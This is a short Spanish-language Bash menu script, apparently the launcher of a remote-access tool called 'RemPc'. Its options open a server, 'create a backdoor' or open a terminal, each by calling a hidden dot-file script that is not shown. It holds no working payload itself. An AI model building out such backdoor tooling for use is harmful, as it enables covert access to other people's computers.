bash .banner
echo "Introduce la opcion que deseas realizar:"
echo ""
echo "1)Abrir servidor"
echo "2)Crear BackDoor"
echo "3)Terminal"
#echo "4)Decodificar Salida"
echo "4)Ayuda"
echo "5)Salir"
echo ""
read -p "Opcion: " num

if [ "$num" = "1" ]; then
bash .srv
fi

if [ "$num" = "2" ]; then
bash .cr
fi

if [ "$num" = "3" ]; then
bash .panel
fi

#if [ "$num" = "4" ]; then
#bash .dc
#fi

if [ "$num" = "4" ]; then
bash .ay
fi

if [ "$num" = "5" ]; then
bash .banner
echo "        Gracias por usar RemPc!!"
echo ""
fi
